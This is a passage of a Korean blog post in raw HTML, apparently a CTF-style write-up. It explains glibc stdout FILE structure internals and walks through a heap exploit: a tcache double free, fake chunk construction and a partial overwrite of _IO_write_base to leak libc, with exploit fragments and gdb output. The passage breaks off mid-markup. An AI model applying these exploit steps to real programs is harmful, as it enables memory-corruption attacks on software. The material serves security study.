class=\"token operator\">&lt;</span> do_write<span class=\"token punctuation\">)</span>\n\t\t    <span class=\"token keyword\">return</span> n <span class=\"token operator\">-</span> to_do<span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>new_do_write(f,s,do_write) 함수 호출</li>\n<li>fp, stdout 구조체</li>\n</ul>\n<h2 id=\"new_do_write-함수\" style=\"position:relative;\"><a href=\"#new_do_write-%ED%95%A8%EC%88%98\" aria-label=\"new_do_write 함수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>new_do_write 함수</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">_IO_IS_APPENDING</span> <span class=\"token expression\"><span class=\"token number\">0x1000</span></span></span>\n\n<span class=\"token keyword\">static</span> size_t <span class=\"token function\">new_do_write</span> <span class=\"token punctuation\">(</span>FILE <span class=\"token operator\">*</span>fp<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">,</span> size_t to_do<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n  size_t count<span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">// 전달 받은 파일 포인터의 _flags 멤버 변수의 값이</span>\n\t<span class=\"token comment\">//  _IO_IS_APPENDING 비트를 포함하고 있는지 확인한다.</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_flags <span class=\"token operator\">&amp;</span> _IO_IS_APPENDING<span class=\"token punctuation\">)</span>                              \n    fp<span class=\"token operator\">-></span>_offset <span class=\"token operator\">=</span> _IO_pos_BAD<span class=\"token punctuation\">;</span>\n\n  <span class=\"token comment\">// 전달 받은 파일 포인터의 _IO_read_end 포인터와</span>\n\t<span class=\"token comment\">// _IO_write_base 포인터가 다른지 확인한다.</span>\n  <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_IO_read_end <span class=\"token operator\">!=</span> fp<span class=\"token operator\">-></span>_IO_write_base<span class=\"token punctuation\">)</span>                  \n    <span class=\"token punctuation\">{</span>\n      off64_t new_pos\n\t<span class=\"token operator\">=</span> <span class=\"token function\">_IO_SYSSEEK</span> <span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">,</span> fp<span class=\"token operator\">-></span>_IO_write_base <span class=\"token operator\">-</span> fp<span class=\"token operator\">-></span>_IO_read_end<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>new_pos <span class=\"token operator\">==</span> _IO_pos_BAD<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n      fp<span class=\"token operator\">-></span>_offset <span class=\"token operator\">=</span> new_pos<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token comment\">// 만약 line 8의 조건에서 값이 같다면</span>\n<span class=\"token comment\">//  _IO_SYSWRITE 함수를 통해 new_do_write 함수의 인자인 data를 to_do의 크기만큼 출력한다.</span>\n  count <span class=\"token operator\">=</span> <span class=\"token function\">_IO_SYSWRITE</span> <span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> to_do<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   \n                      \n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_cur_column <span class=\"token operator\">&amp;&amp;</span> count<span class=\"token punctuation\">)</span>\n    fp<span class=\"token operator\">-></span>_cur_column <span class=\"token operator\">=</span> <span class=\"token function\">_IO_adjust_column</span> <span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_cur_column <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> count<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">_IO_setg</span> <span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">,</span> fp<span class=\"token operator\">-></span>_IO_buf_base<span class=\"token punctuation\">,</span> fp<span class=\"token operator\">-></span>_IO_buf_base<span class=\"token punctuation\">,</span> fp<span class=\"token operator\">-></span>_IO_buf_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  fp<span class=\"token operator\">-></span>_IO_write_base <span class=\"token operator\">=</span> fp<span class=\"token operator\">-></span>_IO_write_ptr <span class=\"token operator\">=</span> fp<span class=\"token operator\">-></span>_IO_buf_base<span class=\"token punctuation\">;</span>\n  fp<span class=\"token operator\">-></span>_IO_write_end <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_mode <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span>\n\t\t       <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>fp<span class=\"token operator\">-></span>_flags <span class=\"token operator\">&amp;</span> <span class=\"token punctuation\">(</span>_IO_LINE_BUF <span class=\"token operator\">|</span> _IO_UNBUFFERED<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t       <span class=\"token operator\">?</span> fp<span class=\"token operator\">-></span>_IO_buf_base <span class=\"token operator\">:</span> fp<span class=\"token operator\">-></span>_IO_buf_end<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> count<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>stdout→flags 에 <code class=\"language-text\">_IO_IS_APPENDING</code> 이 포함되어 있어야 한다.</li>\n<li>_IO_new_do_write, _IO_SYSWRITE를 통해 _IO_write_base를 출력한다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">count <span class=\"token operator\">=</span> <span class=\"token function\">_IO_SYSWRITE</span> <span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> to_do<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token operator\">--</span><span class=\"token operator\">></span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token function\">_IO_sputn</span> <span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> hp<span class=\"token operator\">-></span>_IO_write_base<span class=\"token punctuation\">,</span> to_flush<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> to_flush<span class=\"token punctuation\">)</span>\n\tresult <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h2 id=\"how-to-exploit-using-stdout\" style=\"position:relative;\"><a href=\"#how-to-exploit-using-stdout\" aria-label=\"how to exploit using stdout permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How to exploit using stdout</h2>\n<ul>\n<li>flags, _IO_write_base를 조작 한다.</li>\n<li>_IO_write_base를 하위 바이트만 조작하여 라이브러리 줏소가 위치한 주소를 가리키게 하여 라이브러리 주소를 출력할 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">gdb<span class=\"token operator\">-</span>peda$ p <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_IO_FILE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token constant\">stdout</span>\n$<span class=\"token number\">5</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  _flags <span class=\"token operator\">=</span> <span class=\"token number\">0xfbad2887</span><span class=\"token punctuation\">,</span> \n  _IO_read_ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_read_end <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_read_base <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_write_base <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_write_ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_write_end <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_buf_base <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e3</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">131</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _IO_buf_end <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd07e4</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">132</span><span class=\"token operator\">></span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span> \n  _IO_save_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _IO_backup_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _IO_save_end <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _markers <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _chain <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dcfa00</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdin_<span class=\"token operator\">></span><span class=\"token punctuation\">,</span> \n  _fileno <span class=\"token operator\">=</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">,</span> \n  _flags2 <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _old_offset <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffffffffffff</span><span class=\"token punctuation\">,</span> \n  _cur_column <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _vtable_offset <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _shortbuf <span class=\"token operator\">=</span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">,</span> \n  _lock <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dd18c0</span> <span class=\"token operator\">&lt;</span>_IO_stdfile_1_lock<span class=\"token operator\">></span><span class=\"token punctuation\">,</span> \n  _offset <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffffffffffff</span><span class=\"token punctuation\">,</span> \n  _codecvt <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _wide_data <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7dcf8c0</span> <span class=\"token operator\">&lt;</span>_IO_wide_data_1<span class=\"token operator\">></span><span class=\"token punctuation\">,</span> \n  _freeres_list <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _freeres_buf <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  __pad5 <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span> \n  _mode <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffff</span><span class=\"token punctuation\">,</span> \n  _unused2 <span class=\"token operator\">=</span> <span class=\"token string\">'\\000'</span> <span class=\"token operator\">&lt;</span>repeats <span class=\"token number\">19</span> times<span class=\"token operator\">></span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>해당 구조체를 덮어쓰기 위해서는 라이브러리 주소를 이용해야 한다.</li>\n<li>main_arena 영역 주소가 힙 청크에 남아야 하며 그렇게 하기 위해서는 unsorted bin을 이용해야 한다.</li>\n</ul>\n<h2 id=\"double-free-bug\" style=\"position:relative;\"><a href=\"#double-free-bug\" aria-label=\"double free bug permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Double Free Bug</h2>\n<ul>\n<li>Double Free Bug가 발생하면 같은 포인터를 두 번 가리키며 새로 할당해 값을 쓰게 된다면 ForwarD PTR를 덮을 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">40</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">double</span> <span class=\"token expression\">free test</span></span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">40</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"BBBB\"</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 67.22222222222223%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB20lEQVQoz32Qi46iUAyGfY2dkQNyO9wGkNsBHBEVFFQEwRtjRHF1J/v+L7BRJ9nERJM/TZP269+2sZiE8Tj2/KFlOzrSAMUSDOt4bts0MJIFFFR1xH2ogmLodsf1PILmMRIatsNJakMLVNMV7JmljC3t0xJVUUO8anAa4lmRBxTXJCFGQpyGgILNFovTHE5z97mN97HTlD5+dfS3oQWUPqAEjISAumKAuvYRDI8zP8k1v8F3NbDIxmUJ9ExshAjVJ2ieYOC9dodfqNEMEZDEt672HiBc6QNGxiihxUISQorn7p5PYVwWaSgLotmWPlltAHUk2UgxRUHmTMTSkCMorkVzxE2P8MARkCrFw/48HEaLkdYbsHqvpXQZQTMYEUFRg2L7FmVWAA9wuljmy20wmaWbTVkdt9VZ1m3D6Zb7Y1nVcZLhFCToH/NH52m+SpdlP5wkxaas6l190SzHdL3d8bw7nqdZgVPw6c1Jvs5WpR9O5qvt7nCqzt//4foyz1evHjbNlvNi64dxkq/L6rirL23LNtxueajLw2m2KHD6uXO63Obrr8F4mq3LfX0+XP7qlmt1evvTn/3v77RYv1rbCyI/iC3X88M4mqVxWkiqIesoSrIoWfSC0Yu1/wFrcZlBwWN9FQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./4.png\"\n        title=\"./4.png\"\n        src=\"/static/086826f90fba136c03d4bc31a9fe97f5/37523/4.png\"\n        srcset=\"/static/086826f90fba136c03d4bc31a9fe97f5/e9ff0/4.png 180w,\n/static/086826f90fba136c03d4bc31a9fe97f5/f21e7/4.png 360w,\n/static/086826f90fba136c03d4bc31a9fe97f5/37523/4.png 720w,\n/static/086826f90fba136c03d4bc31a9fe97f5/ee455/4.png 863w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>FD 위치의 주소 값이 변경되어 4바이트의 0x42가 들어 가 tcache영역을 확인하게 되면 다음 주소 값이 변경된 것을 확인할 수 있겠다.</li>\n</ul>\n<h2 id=\"fake-chunk-구성\" style=\"position:relative;\"><a href=\"#fake-chunk-%EA%B5%AC%EC%84%B1\" aria-label=\"fake chunk 구성 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Fake chunk 구성</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">fake</span> <span class=\"token expression\">chunk</span></span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xd1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>unsorted bin을 구성하기 위해서는 tcache를 사용하지 않게끔 7개의 bin을 꽉 채워야 하며 <code class=\"language-text\">0x78</code> 크기 까지 할당할 수 있기 때문에 <code class=\"language-text\">0x410</code> 초과의 크기만큼 할당한후 해제하여 unsorted bin으로 만드는 것은 불가능하다.</li>\n<li>Fake Chunk를 해제해 main_arena 영역의 주소를 써야 하며 Fake Chunk를 해제하기 위해서는 인접한 청크가 존재해야 한다.</li>\n<li>0x555555757260 + 0xd0 주소에 힙 청크가 존재해야 한다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 469px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 81.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAAsTAAALEwEAmpwYAAADAklEQVQoz0WT227cRBzG/QogVYqAIOWCCiEqkdIqTbzZXcdnj8/2jD3nGXvX2e6mm6VpqBoJcZC4gSskLvocIF6ASyTeCXkb1Af46Zvv983fiKZWOLXDJ5P5xAnsuLLxWt9cdd9u1Mu1erXi19GsfPrF1DlNmkThVOFMt4kiRR9OciMpWzQM8rc7+ctr/OtNuur75Yvlejest93ldrO7TUt09PDLmRMtnn+z2uwur14O691me1sQZkRhXu6G23/fvvn797t/3mZ3qyJDkAqEadUwKvT53H5wcHj8zKyYQIJDoWousNQhRUZcwLyhfgNdBGdFapGaXa35dsNfPG8uB3m9sYv0068emTDFm7W4XvPdFdtu9M0uQLURF3UOSV42Wdl4QXzu+GS5pMuB9F2OWaP01PU+/uzhE3MKicJcYdE1VGDeOT7YJyOalgjk6MKLzmZOw1TDFOYSMSX65cz2Pnjw0fGJCbluhWxF1zBF9SKIUwPkdQ5xUkCQQ9sH5txtuWqFxkIhppjuPZA+Pjkz505FBBaq5brhknXLMB1to6plWdXGBfSixLRcLDssOyJ1wzXTfVrCV6/f2AEoiSBSY9m1XLF+iEa4gCUiWYXiAnlReg+Le1j0g+1H333/48lkXlM1Jos9/C45qlDesqTGoKjHznOn5aoZxaiGjY+vW/LHn39FaVkRyXRP9YLITi5XICsMYLnACYDluj4I09K03BpzxBSiosKiZbJqyQ8//fxsMp86oR2AiyC+8CM3Sk+nlhHPndj2c8v1gjjKqnPbq1qGmKwxLVrWCmWH4MODTz5/dGz5wA6APcLABXsY1G2BRQpJUrV2AM5mztjqXWem5WKYOf7B4dFTc4bVgnc97waqF2pYx0VpxDnMIUlLFJeND1Jz7ux36ojQaC/McoODw6OvT88hHcfH74VlRlyisqF729ANk4nlYtHdw0yJxXsY8dHf//B+qjArsxrH+fhJ3DA5nV5AKsbDoLzCnKhuZnsHh0ePT8wKc0Q5pLImHMvOB8l/gQk8tL132WgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./4_1.png\"\n        title=\"./4_1.png\"\n        src=\"/static/2942358e137802a86bff75bb0928b56a/5f759/4_1.png\"\n        srcset=\"/static/2942358e137802a86bff75bb0928b56a/e9ff0/4_1.png 180w,\n/static/2942358e137802a86bff75bb0928b56a/f21e7/4_1.png 360w,\n/static/2942358e137802a86bff75bb0928b56a/5f759/4_1.png 469w\"\n        sizes=\"(max-width: 469px) 100vw, 469px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">for</span> i in <span class=\"token function\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"AAAA\"</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>0x555555757260+0xd0 주소에 청크가 존재해야 하며 해제할 시 정상적으로 해제가 가능하지만 아직 해제는 불가능 하다 정상적으로 할당된 청크가 아니기 때문이다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 471px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 34.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAABZ0lEQVQY0y3N626bMABAYd5imbRMTf9sUjfRpjSkSdM2EC4JYMB3x8bYxsmmvf8DTJ32AOd8Qb58yqK4fFzt3g5HAJ/f0qrHAPG6Q6eOtJjnFfj+I7z9dvfzMQ6jOIzWYRTfPz3fhVHQIAaZ6jAHmB/KapcU0npp/VkbgDmVw8t7+unLzTLecj0p5wd3lcab658W0aCBtKey6Und08OxftnnYrRcW6ENOY/K+fesnM0XD6sNkYYPo9COD0baC0AkqHrcEdF0pO5JUlTbfca1ZYMR2lBl9HRJ8uNsvrhfbZDUfBj5YKkapfUNxAGAFDIFIGsgy/7Ljmt7Hi1VVk/XpPiIH+INUR9HMTo2GOX+yS1miA8tYg3i2anZpYWyF2m8shPXk7n8TovTbL5YxlumnTJOGi9Gp/2vjrCgqNuqxWXdFXX/muTr1xQy2bMzYqIlgkq9S7LPX2/DaA2wgFRAJjvCW8z3WfkX2oSAkw6WmVAAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./5.png\"\n        title=\"./5.png\"\n        src=\"/static/5864bba5e66045b88f0ec3e916611759/1f09d/5.png\"\n        srcset=\"/static/5864bba5e66045b88f0ec3e916611759/e9ff0/5.png 180w,\n/static/5864bba5e66045b88f0ec3e916611759/f21e7/5.png 360w,\n/static/5864bba5e66045b88f0ec3e916611759/1f09d/5.png 471w\"\n        sizes=\"(max-width: 471px) 100vw, 471px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"how-to-free\" style=\"position:relative;\"><a href=\"#how-to-free\" aria-label=\"how to free permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How to Free?</h2>\n<ul>\n<li>첫 번째 할당 때 FD의 한 바이트를  “\\x70”으로 덮어 써 Fake Chunk의 데이터 부분을 가리키도록 한다. (FD: 0x555555757270)</li>\n<li>두 번 할당시 해당 영역에 할당 가능하다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.22222222222222%; position: relative; bottom: 0; left: 0; background-image: 